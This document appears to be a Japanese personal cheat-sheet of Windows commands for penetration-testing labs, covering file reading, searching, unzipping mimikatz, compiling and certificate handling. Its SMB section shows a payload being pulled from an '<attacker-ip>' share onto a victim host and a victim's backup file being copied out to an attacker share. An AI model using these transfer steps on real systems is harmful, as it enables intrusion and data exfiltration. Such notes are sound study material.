---
title: File
parent: Windows
grand_parent: General
---
# ファイルの中身
<details markdown="1">
<summary>type,gc</summary>

## type
```cmd
type hoge.txt
```

# gc
```powershell
gc nsclient.ini
```
![](../../../assets/images/Pasted%20image%2020260515200136.png)
</details>

---
# ファイル探索
<details markdown="1">
<summary>findstr</summary>

```bash
C:\>tasklist | findstr CloudMe

# 除外
tasklist | findstr /V CloudMe
```
---
# 解凍
```bash
Expand-Archive -Path .\mimikatz.zip
```
</details>
# Share

<details markdown="1">
<summary>net use</summary>

net use + copy を使う（psexec で実現する方法）

psexec.py でシェルが出たら SMB マウントしてコピーできます。

例：Kali の共有を Windows にマウントしてファイル転送

Kali 側 SMB サーバ（例：impacket-smbserver）を起動：

```zsh
sudo smbserver.py share /tmp
```


psexec で接続後（Windows側で実行）：

```cmd
net use Z: \\<attacker-ip>\share
copy Z:\shell.exe C:\Windows\Temp\
```

これで psexec 経由でファイル転送可能

## Powershell
```powershell
PS C:\\Users\\victor\\Downloads> New-SmbMapping -RemotePath '\\\\192.168.45.168\\offsec' -Username "kali" -Password "toor" -LocalPath 'F:'

Status Local Path Remote Path
------ ---------- -----------
OK     F:         \\\\192.168.45.168\\offsec
PS C:\\Users\\victor\\Downloads> cd F:
PS F:\\> cp C:\\Users\\victor\\Downloads\\backup.rar ./
```
</details>

---
# コンパイル

<details markdown="1">
<summary>gcc</summary>
```bash
gcc hello.c -o hello.exe
```
# 証明書
<details markdown="1">
<summary>証明書のインポート</summary>
［スタート］→［ファイル名を指定して実行］をクリックし、名前の枠に「certmgr.msc」と入力して［OK］をクリックします。証明書管理画面が表示されますので、[信頼されたルート証明機関]の証明書フォルダを右クリックして、「すべてのタスク」から「インポート」を選択します
</details>

<details markdown="1">
<summary>certutil</summary>
# ハッシュ値の取得

## certutil
```bash
certutil -hashfile ファイル名 sha1
```

</details>